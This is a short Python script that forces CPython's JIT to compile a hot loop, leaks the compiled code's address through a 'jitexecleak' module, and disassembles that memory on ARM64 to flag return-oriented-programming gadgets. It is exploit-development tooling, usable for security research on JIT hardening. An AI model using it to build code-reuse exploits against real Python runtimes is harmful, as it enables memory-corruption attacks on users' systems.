import ctypes
import jitexecleak
from capstone import *

# Step 1: "Hot" function to force JIT emit gadgets
def rop_hot_loop(a, b):
    acc = 0
    for i in range(100000):
        acc ^= ((a + i) * b) ^ (acc >> 2)
        acc += (i * b) ^ (a << 1)
        acc ^= (a | b) + (i & 3)
        if i % 11 == 0:
            acc += a * b
    return acc

# Step 2: Trigger JIT compilation
for _ in range(1000):
    rop_hot_loop(42, 17)

# Step 3: Leak JIT code address
jit_addr = jitexecleak.leak_executor_jit(rop_hot_loop)
print(f"[+] executor->jit_code @ 0x{jit_addr:x}")

# Step 4: Read JIT memory (expand scan size)
length = 0x400  # 1KB
mem = ctypes.string_at(jit_addr, length)

# Step 5: Capstone disassembly setup
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True

print(f"[*] Disassembling 0x{jit_addr:x} - 0x{jit_addr + length:x}")
for i in md.disasm(mem, jit_addr):
    # Highlight potential gadgets
    if i.mnemonic in ["ret", "br", "blr", "ldr", "mov"] or "x16" in i.op_str:
        print(f"  [GADGET] 0x{i.address:x}:\t{i.mnemonic:<6}\t{i.op_str}")
    else:
        print(f"            0x{i.address:x}:\t{i.mnemonic:<6}\t{i.op_str}")
